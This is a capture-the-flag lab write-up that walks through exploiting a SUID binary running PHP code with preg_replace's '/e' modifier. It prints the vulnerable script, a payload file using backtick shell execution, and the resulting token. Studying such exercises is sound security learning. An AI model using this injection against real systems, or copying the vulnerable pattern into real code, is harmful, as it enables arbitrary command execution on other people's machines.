
# Level06 Documentation

## Objective
Retrieve the token for `level07` by exploiting insecure PHP code execution via a SUID binary owned by `flag06`.

## Approach & Tools
- **Technique**: PHP code injection via `preg_replace /e` vulnerability.
- **Tools**: `echo`, `getflag`, shell backticks.

## Step-by-Step Solution

When logged in as `level06`, we see two files:
```bash
ls -l
```
Output:
```bash
-rwsr-x---+ 1 flag06 level06 7503 level06
-rwxr-x---  1 flag06 level06  356 level06.php
```

### 1. Analyze the Binary

Run the binary without arguments:
```bash
./level06
```
Output:
```bash
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```

Run it with an argument:
```bash
echo "test" > /tmp/test
./level06 /tmp/test
```
Output:
```bash
test
```

### 2. Analyze the PHP Script

```php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
```

### 3. Exploit the `/e` Modifier

The line:
```php
preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```
uses the deprecated and dangerous `/e` modifier, which **evaluates the replacement string as PHP code**.

If the file contains:
```txt
[x ${`getflag`} ]
```
then the script evaluates:
```php
y("${`getflag`}")
```
💥 This runs the `getflag` command via shell execution **before** `y()` is called.

---

### 4. Inject and Capture the Token

Create the payload file:
```bash
echo '[x ${`getflag`}]' > /tmp/getflag06
./level06 /tmp/getflag06
```

#### Output:
```bash
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

---

### Key Takeaways

- **SUID Binaries**: Can be dangerous when they execute scripts with user-controlled inputs.
- **PHP /e Modifier**: A major code injection vector in older versions of PHP.
- **Shell Injection via Backticks**: Executing commands inside PHP strings allows arbitrary command execution.
